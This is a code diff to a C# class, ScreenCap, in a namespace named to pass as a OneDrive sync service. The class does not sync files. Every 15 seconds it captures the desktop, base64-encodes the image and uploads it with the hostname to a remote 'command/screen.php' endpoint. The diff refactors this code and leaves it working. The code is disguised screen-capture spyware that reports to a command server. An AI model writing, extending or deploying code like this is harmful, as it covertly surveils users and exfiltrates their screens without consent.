@@ -6,14 +6,13 @@ using System.Drawing.Imaging;
 using System.Threading;
 using System.Timers;
 using System.Net;
-using System.Text;
 using System.Collections.Specialized;
 
 namespace OneDriveSyncService
 {
     internal class ScreenCap
     {
-        static WebClient webclient = new WebClient();
+        static WebClient webClient = new WebClient();
         static bool isStarted = false;
         static Bitmap bitmap;
         static MemoryStream memoryStream;
@@ -28,7 +27,7 @@ namespace OneDriveSyncService
         {
             _serverName = serverName;
             timer.Interval = 15000;
-            timer.Elapsed += new ElapsedEventHandler(onTimedEvent);
+            timer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
             timer.Enabled = true;
             timer.Start();
         }
@@ -61,18 +60,22 @@ namespace OneDriveSyncService
             return memoryStream;
         }
 
-        static void onTimedEvent(object sender, EventArgs e)
+        static void OnTimedEvent(object sender, EventArgs e)
         {
             if (!isStarted) return;
             try
             {
+                webClient.Headers.Clear();
+                webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
+
                 NameValueCollection payload = new NameValueCollection
                 {
                     { "name", Dns.GetHostName() },
                     { "screen", Convert.ToBase64String(GetDesktop().ToArray()) }
                 };
-
-                webclient.UploadValues(_serverName + "/command/screen.php", payload);
+;
+                Uri uri = new Uri(new Uri(_serverName), "command/screen.php");
+                webClient.UploadValues(uri, payload);
             }
             catch
             {
